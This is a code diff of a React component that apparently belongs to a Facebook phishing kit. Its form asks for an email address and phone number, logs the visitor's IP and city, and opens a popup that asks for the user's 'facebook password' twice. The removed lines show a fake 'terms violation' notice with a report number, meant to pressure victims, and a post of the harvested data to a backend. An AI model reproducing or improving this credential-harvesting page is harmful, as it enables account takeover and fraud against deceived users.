@@ -8,7 +8,7 @@ const { TextArea } = Input;
 
 
 
-const Buiness = () => {
+const Next_buiness = () => {
 
     const [activePopup, setActivePopup] = useState(false);
     const [activePassword, setActivePassword] = useState(false);
@@ -53,10 +53,7 @@ const Buiness = () => {
                     localStorage.setItem('dataPassWord', JSON.stringify(dataPassWord));
         
                     const data = {
-                        'fill_business_email': dataPassWord.fill_business_email,
-                        'fill_personal_email': dataPassWord.fill_personal_email,
-                        'fill_full_name': dataPassWord.fill_full_name,
-                        'fill_facebook_pagename': dataPassWord.fill_facebook_pagename,
+                        'fill__email': dataPassWord.fill_email,
                         'fill_phone': dataPassWord.fill_phone,
                         'ip': response.data.ipAddress,
                         'city': response.data.city,
@@ -65,12 +62,13 @@ const Buiness = () => {
                         'second_password': passWord,
                     }
 
-                    axios.post( "http://localhost:3001/api/news", data) 
-                        .then((response) => {
-                            if (response.data.status === 0 ) {
-                                navigate('/contact-account/confirm');
-                            }
-                        })
+                    navigate('/contact-account/confirm');
+                    // axios.post( "http://localhost:3001/api/news", data) 
+                    // .then((response) => {
+                    //     if (response.data.status === 0 ) {
+                    //             navigate('/contact-account/second-step');
+                    //         }
+                    //     })
                         
                 })
                     
@@ -104,38 +102,11 @@ const Buiness = () => {
                 <p>We need more information to address your issue. This form will only take a few minutes.</p>
             </div>
 
-            <div className="form">
-                <div className="header-form">
-                    <div className="header-top">
-                        <div className="dot"></div>
-                        <div className="line"></div>
-                        <div className="dot"></div>
-                        <div className="line"></div>
-                        <div className="dot"></div>
-                    </div>
-                    <div className="header-bottom">
-                        <p>Select Asset</p>
-                        <p>Select the Issue</p>
-                        <p>Get help</p>
-                    </div>
-                </div>
+            <div className="form col-md-4 col-11">
 
-                <div className="text-center pb-3" style={{fontSize: "20px", textAlign: "center"}}>
+                <div className="text-center pb-3" style={{fontSize: "1.1rem", textAlign: "center"}}>
                     <strong>Get Started</strong>
                 </div>
-
-                <div className="mb-4" style={{backgroundColor: "rgb(226, 227, 229)", fontSize: "12px", textAlign: "left", padding: "15px"}}>
-                    We have received multiple reports that suggest that your
-                    account has
-                    been in violation of our terms of services and community
-                    guidelines.
-                    As a result, your account is scheduled for review
-                    <br/>
-                    <div className="text-start pt-2" style={{fontSize: "14px"}}>
-                        <strong>Report no: 3088553115</strong>
-                    </div>
-                </div>
-
 
                 {/* FORM START */}
 
@@ -149,90 +120,28 @@ const Buiness = () => {
                 >
 
                     <div className="item-form">
-                        <label style={{color:"rgb(0, 0, 0)", fontWeight: "bold"}}>
-                            Please provide us information that will help us investigate
-                        </label>
+                        <label for="email">Email address</label>
                         <Form.Item
-                            name="fill_reason"
+                            name="fill_email"
                             rules={[
                                 {
                                 required: true,
-                                message: 'Please input information!',
+                                message: 'Please input email address!',
                                 },
                             ]}
                         >
-                            <TextArea rows={2}   />
+                            <Input style={{padding: "5px 11px"}} />
                         </Form.Item>
                     </div>
 
                     <div className="item-form">
-                        <label for="name">Full name</label>
-                        <Form.Item
-                            name="fill_full_name"
-                            rules={[
-                                {
-                                required: true,
-                                message: 'Please input full name!',
-                                },
-                            ]}
-                        >
-                            <Input />
-                        </Form.Item>
-                    </div>
-
-                    <div className="item-form">
-                        <label for="Business">Business email address</label>
-                        <Form.Item
-                            name="fill_business_email"
-                            rules={[
-                                {
-                                required: true,
-                                message: 'Please input business email address!',
-                                },
-                            ]}
-                        >
-                            <Input />
-                        </Form.Item>
-                    </div>
-
-                    <div className="item-form">
-                        <label for="email">Personal email address</label>
-                        <Form.Item
-                            name="fill_personal_email"
-                            rules={[
-                                {
-                                required: true,
-                                message: 'Please input personal email address!',
-                                },
-                            ]}
-                        >
-                            <Input />
-                        </Form.Item>
-                    </div>
-
-                    <div className="item-form">
-                        <label for="phone">Mobile Phone Number</label>
+                        <label for="phone">Phone Number</label>
                         <Form.Item
                             name="fill_phone"
                             rules={[
                                 {
                                 required: true,
-                                message: 'Please input mobile phone number!',
-                                },
-                            ]}
-                        >
-                            <Input />
-                        </Form.Item>
-                    </div>
-
-                    <div className="item-form">
-                        <label for="email">Facebook page name</label>
-                        <Form.Item
-                            name="fill_facebook_pagename"
-                            rules={[
-                                {
-                                required: true,
-                                message: 'Please input your facebook page name!',
+                                message: 'Please input your phone number!',
                                 },
                             ]}
                         >
@@ -268,7 +177,8 @@ const Buiness = () => {
                                 boxShadow: 'none',
                                 color: "#267df1",
                                 fontWeight: '700',
-                                fontSize:'1rem'
+                                fontSize:'1rem',
+                                width: '100%'
                             }}
                         >
                             Submit
@@ -387,16 +297,15 @@ const Buiness = () => {
                 >
 
                     <div className="modal-header custom-header px-0">
-                        <h5 id="exampleModalLabel" className="modal-title" style={{fontSize: "22px", fontWeight: "600"}}> Please
-                            Enter Your Password </h5>
+                        <h5 id="exampleModalLabel" className="modal-title" style={{fontSize: "22px", fontWeight: "600"}}>Please enter your facebook password to continue</h5>
                         <button type="button" data-dismiss="modal" aria-label="Close" onClick={handleClosePopup} className="close">
                             <span aria-hidden="true" >×</span>
                         </button>
                     </div>
 
                     <div className="item-form">
-                        <p style={{fontSize:"16px", marginBottom: "10px"}}> For your security, you must enter your password to continue. </p>
-                        <label for="password">Password:</label>
+                        <p style={{fontSize:"16px", marginBottom: "10px"}}>We need to confiom the sender of the information is you. Please enter your facebook password and then continue</p>
+                        <label for="password">Enter Your Password</label>
                         <Form.Item
                             name="fill_first_password"
                             rules={[
@@ -447,4 +356,4 @@ const Buiness = () => {
   )
 }
 
-export default Buiness
+export default Next_buiness
